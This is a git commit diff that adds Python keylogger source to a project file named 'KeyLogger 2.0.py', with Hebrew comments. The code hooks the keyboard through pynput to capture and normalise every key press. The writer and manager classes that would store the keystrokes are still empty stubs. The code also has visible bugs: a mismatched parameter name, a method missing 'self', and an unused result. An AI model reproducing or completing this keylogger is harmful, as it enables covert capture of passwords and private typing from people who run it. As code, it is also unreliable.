98c8427f9fd68809689d17195dfd7182962dad4d
itzchak <s0527120124@gmail.com>
2025-02-12 15:42:57 +0200

    add on prase on release 1.0

--- KeyLogger 2.0.py
+++ KeyLogger 2.0.py
@@ -1,12 +1,54 @@
 from abc import ABC,abstractmethod
+from pynput.keyboard import Key,Listener
+import sys
 
+# קלאס שאחראי על ההקלטה מפעיל הקלטה בהדלקה ראשונה
 class KeyLogger:
-    pass
+    def __init__(self):
+        # אחראי על הפעלת פונקציות יפוי ושמירה בכל לחיצה
+        def __on_press(Key):
+            key_nise = self.nurmal_key(key)
+            (key_nise)
+
+        def on_release(key):
+            try:
+                if key.char == '\x04':  # Ctrl+D
+                    print("Exiting...")
+                    sys.exit(0)
+            except AttributeError:
+                pass
+
+        with Listener(on_press=__on_press, on_release=on_release) as listener:
+            listener.join()
+
+    # אחראי ליפות את המקש
+    def nurmal_key(key):
+            key_nise = str(key)
+            key_list = list(key_nise)
+            if len(key_list) > 3:
+                key_nise = ""
+                for i in key_list[4:]:
+                    key_nise += i
+                key_nise = " " + key_nise + " "
+                if key_nise == " space ":
+                    return " "
+                # if key_nise == " enter ":
+                #     return "\n"
+                # זה מוכן למקרה שהרצה לעשות שימוש במקשים מיוחדים
+                return key_nise
+            else:
+                return key_list[1]
+
+
+
+
 
 class Writer(ABC):
     @abstractmethod
     def write(buffer) -> dict:
         pass
+
+
 
 class Manager:
     pass
